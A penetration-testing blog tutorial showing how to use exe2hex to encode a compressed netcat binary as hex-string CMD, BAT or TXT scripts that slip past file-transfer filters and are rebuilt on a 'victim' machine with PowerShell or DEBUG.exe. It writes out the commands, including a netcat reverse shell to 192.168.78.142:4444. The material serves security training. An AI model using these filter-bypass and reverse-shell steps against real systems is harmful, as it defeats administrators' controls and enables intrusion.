<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">File Transfer Filter Bypass: Exe2Hex</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/file-transfer-filter-bypass-exe2hex/" rel="bookmark"><time class="entry-date published" datetime="2022-02-28T11:50:14+00:00">February 28, 2022</time><time class="updated" datetime="2025-06-23T19:44:58+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong data-start="183" data-end="194">Exe2hex</strong> is a tool that <strong data-start="210" data-end="221">g0tmilk</strong> developed, and you can find it <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/g0tmi1k/exe2hex">here</a></strong></span>. The tool <strong data-start="270" data-end="289">transcribes EXE</strong> into a series of <strong data-start="307" data-end="330">hexadecimal strings</strong>, which <strong data-start="338" data-end="351">DEBUG.exe</strong> or <strong data-start="355" data-end="369">Powershell</strong> can restore into the original EXE file. Afterward, the script runs on the victim machine to reconstruct and execute the EXE. This proves highly useful in <strong data-start="524" data-end="554" data-is-only-node="">advanced pentest scenarios</strong> where <strong data-start="561" data-end="586">system administrators</strong> block the <strong data-start="597" data-end="632">transfer or upload of EXE files</strong>. Therefore, <strong data-start="645" data-end="659">pentesters</strong> can use this tool to <strong data-start="681" data-end="704">bypass such filters</strong>. In this article, we demonstrate <strong data-start="738" data-end="759">four such methods</strong>.<br/>
</span></p>
<h3><span style="color: #800000;">Table of content</span></h3>
<ul>
<li><span style="color: #000000;">Background</span></li>
<li><span style="color: #000000;">Exe2hex CMD script (PoSH method)</span></li>
<li><span style="color: #000000;">Exe2hex URL encoded CMD script (PoSH method)</span></li>
<li><span style="color: #000000;">Exe2hex BAT script (DEBUG.exe method)</span></li>
<li><span style="color: #000000;">Exe2hex STDIN to CMD Script (PoSH method)</span></li>
<li><span style="color: #000000;">Exe2hex TXT file (DEBUG and PoSH method)</span></li>
<li><span style="color: #000000;">Conclusion</span></li>
</ul>
<h3><span style="color: #800000;">Background</span></h3>
<p><span style="color: #000000;"><strong>DEBUG.exe</strong> is a by default available executable in Windows that helps a user troubleshoot programs. It also has a feature where it can restore a series of hexadecimal strings into an executable file. The same can be achieved by Powershell. The methodology is very simple:</span></p>
<p><strong>STEPS</strong></p>
<p><span style="color: #000000;">1: Choose an EXE</span></p>
<p><span style="color: #000000;">2: Compress it using UPX</span></p>
<p><span style="color: #000000;">3: Use exe2hex to convert it into a file containing hexadecimal strings</span></p>
<p><span style="color: #000000;">4: Transfer the file to the victim system</span></p>
<p><span style="color: #000000;">5: Restore the file back to exe and execute</span></p>
<p><span style="color: #000000;">Let’s start by compressing an exe file. We will be using a tool called UPX.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjyh4M9N3uVg0vhDlelzlEEiWQ1otcE_HfENLeOd_TC50XHz8TFTSdpwDVGRbMnChCEiyjzIAsgp2SUcx4zzkAZVDI8seVx4TblUmktY61EuAQhszOme1A00R_5Z-3tnid-S5APFOwjljnGZY3tF6g6i4bRYG0CepIjfVSRFwQ0kla3TZf_RPT6VKmzsw=s16000"/></span></p>
<p><span style="color: #000000;">As you can see there are many options to compress a file. We will be using -9 filter which provides 50% compression on average.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">upx -h
cp /usr/share/windows-resources/binaries/nc.exe .
ls -lah nc.exe
upx -9 nc.exe
ls -lah nc.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj8S7vY0XHsI5sbXQoS-3_0uSBIOhRjcQYVfXwRSTH-Ebdo1sHySpL_nd7DShEmBFBX4eTL9_NaTqjnEonBmDb5pgwyHtKl0OWkLBk0oTvjY5_7xUbB3onetSOxzuyAnG2-x6sMeWj3klUY4FaQ-7Zu2Usk6_NKdxPXT_gq4Lh2N41dQ1fLs0j-NcYcGw=s16000"/></span></p>
<p><span style="color: #000000;">Note: You can achieve the same thing by using -cc filter with the exe2hex tool.</span></p>
<h3><span style="color: #800000;">Exe2hex CMD script (PoSH method)</span></h3>
<p><span style="color: #000000;">Now that we have compressed the EXE, we can use <strong data-start="815" data-end="826">exe2hex</strong> to convert it into a <strong data-start="848" data-end="860">CMD file</strong>. This file includes multiple <strong data-start="890" data-end="913">hexadecimal strings</strong>, as shown below. A parameter <code data-start="943" data-end="947">-p</code> creates and appends these <strong data-start="974" data-end="999">converted hex strings</strong> into a temporary file named <strong data-start="1028" data-end="1041">“nc.hex.”</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">exe2hex -x nc.exe -p nc.cmd
head nc.cmd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgmh5Ms1cde5ErdNTQmtTvxk87lNaGasSsBmTA0oZIvrs-YUvHh_6QFjgS7XNdt8ZVObcyBK1062LMik9AJhxPUra2xwXQQaJixW2-i5WXiQwN3N7Imkd6wlVnp686HTCyp-oO4KpJW7dOXYtVG3v09xSCXIUrt4j2c4PmTyD8zXY6tZetY2h-cfqOjew=s16000"/></span></p>
<p><span style="color: #000000;">At the end of the file, you can see a powershell command which is restoring the hex strings back into exe file and removing nc.hex</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail -n 3 nc.cmd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg5w04aOLUNCrY9bm5O7OZjBdsGDnKqf73mA5il-kP4VnDecdRC9TR94-_eX_ndf0MjD214ELPt-HuV94UZXMWQPdvghzxbpux8g5T8k01wMf5tuvLSzLfFgFF0SK2rf5vqvY68lfzi7OfBHnoHm6v785pT3NdY3GfuvurHy1ftAxQEHJgg-oDJtsrwCQ=s16000"/></span></p>
<h3><span style="color: #800000;">Exe2hex URL encoded CMD script (PoSH method)</span></h3>
<p><span style="color: #000000;">What we saw above can be repeated with a bonus. The same script can also be URL encoded with the -e option.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">exe2hex -x nc.exe -e -p nc.cmd
head -n 5 nc.cmd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEirKp_eUg1_EdU2jI7ZdUueWzeijFbXeHdc66AMGCP3zPRXj0rCLgarQLpTwTPQM5AXbEDzXCDeMU8h84aHWvYa11kXgckiMXYMqEQ9xQsLHhPuv39rHG0XElzZLfbMRl8HPkxnUYHwCgDk2WxMXQv2zqSmG7MB3LgVz76BeiFn1JBZdDytZ2iPmIU8vQ=s16000"/></span></p>
<p><span style="color: #000000;">Now, we can transfer this CMD file to the victim system and execute it using the command prompt. As you may observe after the execution has finished, a nc.exe file is generated at the compressed size.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">@echo off
nc.cmd
nc.exe 192.168.78.142 4444 –e cmd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgz6u_Kzt8wfYCJx4M4e-qYC9m7EpQE6-vCeV1gv2UiHW47svkDe-B17V6xfSHF5ZQblVUFRZoj8-HbExqI9BMu5PVWvttd2qrxrfh0YdgUCxMZMBy0-NALgCg-epERi3xs10oM9dvA_v6PVOCFMZ0ack8WrpRgXIE_sdUKOG_7Fx_sdbi-T6q45YQXVw=s16000"/></span></p>
<h3><span style="color: #800000;">Exe2hex BAT script (DEBUG.exe method)</span></h3>
<p><span style="color: #000000;">So far, we have explored how to use PowerShell to restore hex into an exe file. In the same way, you can use the DEBUG.exe file. Exe2hex can generate a bat file like so:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">exe2hex -x nc.exe -b nc.bat
head -n 5 nc.bat
tail -n 7 nc.bat</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhGjQjuRL9f-Rs5v4G4jIuAVVZt7w8B11CWNmB7ZU9LVjStGaLlCILtTjM8UqrGAd1K2gMKtYpuPV5Ck19bH7F1LgCEfioib9yURj3q6fFLittSaIOlszr04o4EmMNM29Wbz3Uzu8s5iQU8t8f_3Svr7yqVvrs_CkdXi8DwjLjt-ASp1T4GzZLWhv2xsw=s16000"/></span></p>
<p><span style="color: #000000;">After that, you can run the bat script on windows and it will create an exe file. If it throws you an error, you need to add DEBUG.exe’s path in environment variables. As you can see, nc.exe has become an executable now.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg3jEpnbR8iQMqvTHP2YvcNIKLTLKzfyux-MXC-nyUn9NKLKfRlU11xvpA6-UIpjLiaPcPYe7N_RjANxeqIAn008rgWkGU-bDl6K9iLJuTbhQDs_07HLQZmHp5o4y0IDFkPrQI3vW3zPKuf81k8fPopxZ7eS7pq-Ez2nZd8gdUxwsQbJ2MNaBuXHrEa4g=s16000"/></span></p>
<h3><span style="color: #800000;">Exe2hex STDIN to CMD Script (PoSH method)</span></h3>
<p><span style="color: #000000;">The tool can also take input from STDIN. This could be useful in scenarios where someone can download an executable available on the internet using tools such as curl/wget, and filters block that.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat nc.exe | exe2hex -s -b nc.bat -p nc.cmd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiGsmb3n3Sy0HqS45wl9NNiw-009VA3w4j1heDH4voVX7XScfdp0paOpRDx4jScmaL3g-u_4W5coNqxE9oNloqC6THaxUdETRNaH3DXNiLcukL57qpLX4rzv_As_pFtDTdLQkyXoeKdEyRkhILQ-GaPHWKuBuyebybjOHbJpRy6XNooH_uNyzK__siQWA=s16000"/></span></p>
<p><span style="color: #000000;">The -s filter is responsible for reading from STDIN. The cmd file generated with this option looks a bit different as the file generated has the name “binary.hex” and the final exe file as “binary.exe”</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiltN0EU2kj3y4WJ8GApg7jJgvXgTJM9RJNw6OYRNvaOAx1J0y-v6QzsepGipaFxdY_lrz6XgJdOZyUNhBZGpU6Qw6H0SNiVLSl-O3DBieGAKflmo1VmkX-xNqCmT4TuKxSJK6lir4w2Km_dbWK1vscNldVxNMfVUwoT82diSxuCX6mYlmxopnopVMoXw=s16000"/></span></p>
<p><span style="color: #000000;">It can be run now!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiY6NFaIZBlAqu09EnH55omoNuMQ62nY0Ga4AP94MMdLoYN2yU3Jvr3scJXKocQJrf5bgX46XVymEP-mQab3_vXGvICMo-6OArva48mZ27e4wcbHAkz1mu9C5o03IQ-KnH55_yCldjEXfXDimMxYXfC1rtpVTdJK7KRRcvDmKVwGFG3zY6U85M2wutywA=s16000"/></span></p>
<h3><span style="color: #800000;">Exe2hex TXT file (DEBUG and PoSH method)</span></h3>
<p><span style="color: #000000;">We saved the best for last. The tool can also convert EXE files in hexadecimal strings txt files. This is highly useful for situations where advanced filters are in place.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">exe2hex -x nc.exe -b nc.txt
head -n 5 nc.txt
exe2hex -x nc.exe -p nc.txt
head -n 5 nc.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgesKIBgliot6TTl5-t5_Vla-ElY9uuxMyxmjm8Xk1EC2rLQkkZFddzzJUo2R0ef6I2NtP31jUixo3BZSj3IpiPGtXKdd6OxpOYuoBisRYcgFAHvOABp7o8Xx31iAmuxn_eEvRSKwi7LMbSjorKFXpcpjUiIO6jmaYvO_LPhT-jc6oZ0ql69EtY6a8JRQ=s16000"/></span></p>
<p><span style="color: #000000;">One other filter is the -l filter that specifies the number of bytes in each line.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">exe2hex -x nc.exe -l 10 -p nc.txt
head -n 5 nc.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiQy8UGd974YgebtPCN7_gdfftDvj_18y99ntvDGh4aXTb3JRwLCifoa773h3GLutk7kxxh3xJuDrvN-ibtyy-qqd3wkIpE-f_AAM1m4EgVl7yrJZ7tHyVIoRCvSukFxLTatfytZnRDDgzYtNPLOR7qCWu3S_ETW3l-GlRLB5gmSYcDn5rprgHC33VH-Q=s16000"/></span></p>
<p><span style="color: #000000;">Now, one can rename the file easily in the victim machine using a command prompt or copy it as a different extension (runnable script) and then run like following:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">copy nc.txt nc.cmd
@echo off
nc.cmd
nc.exe 192.168.78.142 4444 -e cmd</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiIRw0SVn__nxISghOD9VPP1A06sCetGdiEolFsmwJsdP6JkQLR_73pQ2n-YRKAYRw4NOiSOkRxbIplNYm-UIRG0kTkYNFqnHc-nLTDPQbHsq8t_w5ysOwRb4RIsrzkBgK-CjUm-zZybWfIVcuZ4tmc5EUHWlIA5nx6ziwW9chRJljxIPm4mZmPG6VV1g=s16000"/></span></p>
<p><span style="color: #000000;">If you tried the above-mentioned methods, you must set up a listener on your kali machine and try to run this executable. As you could see, the EXE file is working properly!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgLDH8GYZgvgPonaWCnoHdDAz8oiU5fAJR30BPQv8C05vfnQqty_V1WsxW4ft9st9yBOWigCnqArEQK5Q058AcxxaNqJbKPUBMhdmiXphsJkP3NSXpP43pkqiSiYgGgIYAaAWhEoqgrKcbA44cVsFzvHJAheLFmG_XotMWZikGVStQE3JA5xUgxoJaoTA=s16000"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">One sees many scenarios while pentesting where there are certain file upload/download filters either by proxy or WAF. We just presented a way to bypass those defense mechanisms using exe2hex. Hope you liked the article. Thanks for reading.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
